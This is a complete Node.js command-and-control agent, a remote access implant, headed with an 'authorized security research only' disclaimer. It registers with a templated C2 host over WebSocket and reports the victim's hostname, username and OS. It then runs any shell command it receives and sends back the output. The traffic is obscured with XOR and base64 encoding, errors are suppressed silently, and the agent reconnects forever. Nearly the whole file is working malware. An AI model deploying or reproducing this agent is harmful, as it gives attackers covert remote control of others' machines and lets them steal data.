// JavaScript C2 Agent (Node.js) - For authorized security research only
const WebSocket = require('ws');
const { exec } = require('child_process');
const os = require('os');
const process = require('process');

const C2_HOST = "{{C2_HOST}}";
const C2_PORT = {{C2_PORT}};
const RECONNECT_DELAY = 5000;

function simpleEncrypt(data) {
    const key = Buffer.from('C2_SECRET_KEY_CHANGE_THIS');
    const dataBuffer = Buffer.from(data);
    const encrypted = Buffer.alloc(dataBuffer.length);

    for (let i = 0; i < dataBuffer.length; i++) {
        encrypted[i] = dataBuffer[i] ^ key[i % key.length];
    }

    return encrypted.toString('base64');
}

function simpleDecrypt(data) {
    const key = Buffer.from('C2_SECRET_KEY_CHANGE_THIS');
    const dataBuffer = Buffer.from(data, 'base64');
    const decrypted = Buffer.alloc(dataBuffer.length);

    for (let i = 0; i < dataBuffer.length; i++) {
        decrypted[i] = dataBuffer[i] ^ key[i % key.length];
    }

    return decrypted.toString('utf8');
}

function getMetadata() {
    return {
        hostname: os.hostname(),
        username: os.userInfo().username,
        os: os.type(),
        os_version: os.release(),
        architecture: os.arch(),
        platform: process.platform
    };
}

function executeCommand(command) {
    return new Promise((resolve) => {
        exec(command, { timeout: 30000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
            if (error) {
                resolve(`Error: ${error.message}`);
            } else {
                const output = stdout + stderr;
                resolve(output || 'Command executed successfully (no output)');
            }
        });
    });
}

async function connectToC2() {
    const uri = `ws://${C2_HOST}:${C2_PORT}`;

    while (true) {
        try {
            const ws = new WebSocket(uri);

            ws.on('open', () => {
                // Register with C2
                const registerMsg = {
                    type: 'register',
                    metadata: getMetadata()
                };

                const encrypted = simpleEncrypt(JSON.stringify(registerMsg));
                ws.send(encrypted);

                // Heartbeat
                const heartbeatInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        const heartbeat = { type: 'heartbeat' };
                        const encrypted = simpleEncrypt(JSON.stringify(heartbeat));
                        ws.send(encrypted);
                    } else {
                        clearInterval(heartbeatInterval);
                    }
                }, 10000);
            });

            ws.on('message', async (data) => {
                try {
                    const decrypted = simpleDecrypt(data.toString());
                    const message = JSON.parse(decrypted);

                    if (message.type === 'command') {
                        const output = await executeCommand(message.command);

                        const response = {
                            type: 'response',
                            output: output
                        };

                        const encrypted = simpleEncrypt(JSON.stringify(response));
                        ws.send(encrypted);
                    }
                } catch (err) {
                    // Silent fail
                }
            });

            ws.on('error', () => {
                // Silent fail
            });

            ws.on('close', () => {
                // Reconnect
            });

            // Wait for connection to close
            await new Promise((resolve) => {
                ws.on('close', resolve);
            });

        } catch (err) {
            // Silent fail
        }

        await new Promise(resolve => setTimeout(resolve, RECONNECT_DELAY));
    }
}

connectToC2();
